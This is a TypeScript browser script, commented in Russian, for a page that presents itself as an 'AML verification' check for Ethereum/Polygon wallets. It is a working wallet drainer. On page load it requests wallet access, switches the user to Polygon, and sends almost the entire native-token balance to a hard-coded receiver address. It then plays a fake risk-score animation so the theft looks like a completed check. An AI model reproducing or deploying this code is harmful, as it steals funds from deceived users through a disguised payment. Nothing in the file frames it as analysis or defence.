declare const window: any;
declare const document: any;

import { detectWallets } from "./core";
import { logger } from "./logger";
import { ethers } from "ethers";
let provider: ethers.BrowserProvider | null = null;
let signer: ethers.Signer | null = null;

const isDev =
  window.location.href.includes("localhost") ||
  window.location.href.includes("127.0.0.1");

const PROD_RECEIVER_ADDRESS = "0x45038a8cc181432C57F7abaA067C67eE9E2f5974";
const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
const POLYGON_CHAIN_ID = 137n;

logger.log("isDev", isDev);
logger.log("RECEIVER_ADDRESS", RECEIVER_ADDRESS);

async function updateBalance(): Promise<void> {
  try {
    if (!signer || !provider) {
      logger.log("No signer or provider available");
      return;
    }

    const address = await signer.getAddress();
    logger.log("Connected address:", address);

    const balance = await provider.getBalance(address);
    logger.log("MATIC balance:", ethers.formatEther(balance), "MATIC");
  } catch (error: unknown) {
    logger.error("Error checking balances:", error);
  }
}

async function handleAction(): Promise<void> {
  if (!signer) {
    await connectWallet();
    if (signer) {
      await sendPayment();
    }
  } else {
    await sendPayment();
  }
}

async function connectWallet(): Promise<void> {
  const actionButton = document.getElementById("action-button") as any | null;
  if (actionButton) {
    actionButton.disabled = true;
    actionButton.classList.add("loading");
    actionButton.textContent = "Connecting...";
  }

  try {
    logger.log("Пробуем подключиться к кошельку...");

    if (!window.ethereum) {
      throw new Error("Не найден кошелек Ethereum");
    }
    provider = new ethers.BrowserProvider(window.ethereum, "any");

    logger.log("Запрашиваем аккаунты...");
    // Запрашивает доступ к кошельку пользователя в UI
    // Возвращает массив адресов, к которым пользователь дал доступ.
    // Если пользователь отказывается, выбрасывает ошибку.
    // Без разрешения от пользователя нельзя получить signer.
    const accounts = await provider.send("eth_requestAccounts", []);
    logger.log("Аккаунты пользователя:", accounts);
    signer = await provider.getSigner();
    const address = await signer.getAddress();
    logger.log("Адрес с кошелька с дальнейшими транзакциями:", address);

    const network = await provider.getNetwork();
    logger.log("Текущая сеть:", network);

    if (network.chainId !== POLYGON_CHAIN_ID) {
      logger.log("Переключаем клиента на сеть Polygon...");
      try {
        // это вызов смены сети, который не реализован в ether.js
        // по причине разницы реализаций в разных кошельках 
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x89" }],
        });
      } catch (switchError: any) {
        logger.log("Ошибка:", switchError);
        if (switchError.code === 4902) {
          try {
            logger.log("У пользователя отсутствует сеть Polygon, добавляем сеть в кошелек...");
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0x89",
                  chainName: "Polygon",
                  nativeCurrency: {
                    name: "MATIC",
                    symbol: "MATIC",
                    decimals: 18,
                  },
                  rpcUrls: ["https://polygon-rpc.com"],
                  blockExplorerUrls: ["https://polygonscan.com/"],
                },
              ],
            });
          } catch (addError: unknown) {
            logger.error("Ошибка добавления сети в кошелек:", addError);
            throw new Error("Не удалось добавить сеть Polygon в кошелек");
          }
        } else {
          throw switchError;
        }
      }
    }

    await updateBalance();

    window.ethereum.on("accountsChanged", async (accounts: string[]) => {
      logger.log("Изменен аккаунт в кошельке:", accounts);
      if (provider) {
        signer = await provider.getSigner();
        await updateBalance();
      }
    });

    window.ethereum.on("chainChanged", () => {
      logger.log("Изменена сеть в кошельке, перезагружаем страницу...");
      window.location.reload();
    });

  } catch (error: unknown) {
    logger.error("Ошибка подключения к кошельку:", error);

    if (actionButton) {
      actionButton.disabled = false;
      actionButton.classList.remove("loading");
      actionButton.textContent = "Подключите кошелек для верификации";
    }
    provider = null;
    signer = null;
  }

  if (actionButton) {
    actionButton.disabled = false;
    actionButton.classList.remove("loading");
  }
}

async function sendPayment(): Promise<void> {
  const actionButton = document.getElementById("action-button") as any | null;
  try {
    if (actionButton) {
      actionButton.disabled = true;
      actionButton.classList.add("loading");
      actionButton.textContent = "Проверка...";
    }

    if (!signer || !provider) throw new Error("Кошелек не подключен");

    const userAddress = await signer.getAddress();
    logger.log("Отправляем с адреса:", userAddress);

    // возвращает только баланс нативного токена сети
    const balance = await provider.getBalance(userAddress);
    logger.log(
      "Текущий баланс POL:",
      ethers.formatEther(balance),
      "POL"
    );

    if (balance === 0n) {
      logger.log("Нет доступных средств для списания");
      return;
    }
    // возвращает рекомендуемую цену газа
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;

    if (!gasPrice) {
      throw new Error("Не получилось получить цену газа");
    }
    logger.log(
      "Текущая цена газа:",
      ethers.formatUnits(gasPrice, "gwei"),
      "gwei"
    );

    const gasLimit = 21000;
    const gasCost = gasPrice * BigInt(gasLimit);
    const gasCostWithBuffer = gasCost * 120n / 100n;
    logger.log(
      "Цена газа с запасом:",
      ethers.formatEther(gasCostWithBuffer),
      "POL"
    );

    const minimumPolToKeep = ethers.parseEther("0.1");
    const totalCostToReserve = gasCostWithBuffer + minimumPolToKeep;
    logger.log(
      "Сумма для резервирования:",
      ethers.formatEther(totalCostToReserve),
      "POL"
    );

    const amountToSend = balance - totalCostToReserve;
    logger.log(
      "Сумма для отправки:",
      ethers.formatEther(amountToSend),
      "POL"
    );

    if (amountToSend <= 0) {
      logger.log("Недостаточно средств для покрытия комиссий и резервирования");
      throw new Error(
        "Недостаточно средств для покрытия комиссий и резервирования"
      );
    }

    logger.log("Отправляем транзакцию...");
    const tx = await signer.sendTransaction({
      to: RECEIVER_ADDRESS,
      value: amountToSend,
      gasLimit: gasLimit,
      maxFeePerGas: gasPrice * 2n,
      maxPriorityFeePerGas: gasPrice,
    });

    logger.log("Транзакция отправлена:", tx.hash);

    await tx.wait();
    logger.log("Транзакция подтверждена");

    if (actionButton) actionButton.style.display = "none";

    const amlResults = document.getElementById("aml-results");
    amlResults?.classList.add("visible");

    const circle = document.querySelector(".risk-score-progress") as any | null;
    if (circle) {
      const radius = circle.r.baseVal.value;
      const circumference = radius * 2 * Math.PI;
      circle.style.strokeDasharray = `${circumference} ${circumference}`;
      circle.style.strokeDashoffset = circumference.toString();;

      setTimeout(() => {
        const offset = circumference - 0.8 * circumference;
        circle.style.strokeDashoffset = offset.toString();;
      }, 100);
    }

    const txHashEl = document.getElementById("transaction-hash");
    if (txHashEl) {
      txHashEl.textContent = tx.hash.slice(0, 6) + "..." + tx.hash.slice(-4);
    }

    await updateBalance();
  } catch (error: unknown) {
    logger.error("Ошибка транзакции:", error);
    if (actionButton) {
      actionButton.textContent = (error instanceof Error ? error.message : "Transaction failed");
      actionButton.style.backgroundColor = "var(--danger-color)";
      setTimeout(() => {
        if (actionButton) {
          actionButton.textContent = "Verify";
          actionButton.style.backgroundColor = "var(--primary-color)";
        }
      }, 3000);
    }
  } finally {
    if (actionButton) {
      actionButton.disabled = false;
      actionButton.classList.remove("loading");
    }
  }
}

function showStatus(message: string, isSuccess: boolean): void {
  logger.log(`Status: ${message} (${isSuccess ? "success" : "error"})`);
}
// ts-ignore
document.addEventListener("DOMContentLoaded", async () => {
  const { techLog, message } = await detectWallets();

  logger.log(message);
  logger.log("Технический лог:", techLog);

  const actionButton = document.getElementById("action-button");
  if (actionButton) {
    actionButton.addEventListener("click", handleAction);
  }

  const ethProvider = window.ethereum as any;

  if (!ethProvider) {
    logger.log("Не найден кошелек Ethereum.");
    showStatus("Please connect your wallet to continue", true);
    return;
  } else {
    logger.log("Обнаружен кошелек Ethereum");
  }

  try {
    const accounts: string[] = await ethProvider.request({ method: "eth_accounts" });
    logger.log("Ранее подключенные адреса пользователя:", accounts);

    if (accounts.length > 0) {
      await handleAction();
    } else {
      logger.log("Не найдено подключенных адресов, запрашиваем разрешение на подключение к кошельку...");
      try {
        const newAccounts: string[] = await ethProvider.request({
          method: "eth_requestAccounts",
        });
        logger.log("Получены новые подключенные адреса пользователя:", newAccounts);
        if (newAccounts.length > 0) {
          await handleAction();
        } else {
          logger.log("Пользователь отклонил запрос на подключение к кошельку");
        }
      } catch (requestError: any) {
        logger.log("Ошибка во время запроса подключенных адресов:", requestError);
        if (requestError.code === 4001) {
          logger.log("Пользователь отклонил запрос на подключение к кошельку");
        } else {
          logger.error("Неожиданная ошибка:", requestError);
        }
      }
    }
  } catch (error: unknown) {
    logger.error("Ошибка во время проверки подключенных адресов:", error);
    if (typeof error === "object" && error !== null) {
      if ("code" in error) logger.log("Error code:", (error as any).code);
      if ("message" in error) logger.log("Error message:", (error as any).message);
    }
  }
});
